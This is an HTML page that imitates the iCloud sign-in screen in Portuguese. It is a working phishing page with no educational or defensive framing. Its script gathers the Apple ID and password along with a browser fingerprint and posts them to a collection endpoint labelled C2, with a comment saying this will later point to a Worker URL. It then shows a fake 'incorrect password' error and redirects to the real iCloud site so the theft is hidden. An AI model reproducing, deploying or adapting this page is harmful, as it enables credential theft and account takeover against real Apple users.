<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>iCloud</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
       background:#f2f2f7;display:flex;align-items:center;justify-content:center;
       min-height:100vh}
  .card{background:#fff;border-radius:16px;padding:32px 24px;width:100%;max-width:360px;
        box-shadow:0 2px 20px rgba(0,0,0,.08)}
  .logo{text-align:center;font-size:22px;font-weight:600;color:#007aff;margin-bottom:24px}
  input{width:100%;padding:14px;border:1px solid #d1d1d6;border-radius:10px;
        font-size:16px;margin-bottom:12px;box-sizing:border-box}
  button{width:100%;padding:14px;background:#007aff;color:#fff;border:none;
         border-radius:10px;font-size:17px;font-weight:600}
  .err{color:#ff3b30;font-size:14px;text-align:center;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="logo">iCloud</div>
  <form id="f">
    <input type="email" id="e" placeholder="Apple ID" required autocomplete="username">
    <input type="password" id="p" placeholder="Senha" required autocomplete="current-password">
    <button type="submit">Entrar</button>
    <div class="err" id="err">Apple ID ou senha incorretos.</div>
  </form>
</div>
<script>
const C2 = "/capture"; // Trocaremos isso pela URL do Worker depois
document.getElementById("f").addEventListener("submit", async (ev) => {
  ev.preventDefault();
  const email = document.getElementById("e").value;
  const pass  = document.getElementById("p").value;
  const fp = {
    ua: navigator.userAgent,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  };
  try {
    await fetch(C2, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({email, pass, fp, ts: Date.now()})
    });
  } catch (e) {}
  document.getElementById("err").style.display = "block";
  document.getElementById("p").value = "";
  setTimeout(() => { location.href = "https://www.icloud.com"; }, 2000);
});
</script>
</body>
</html>
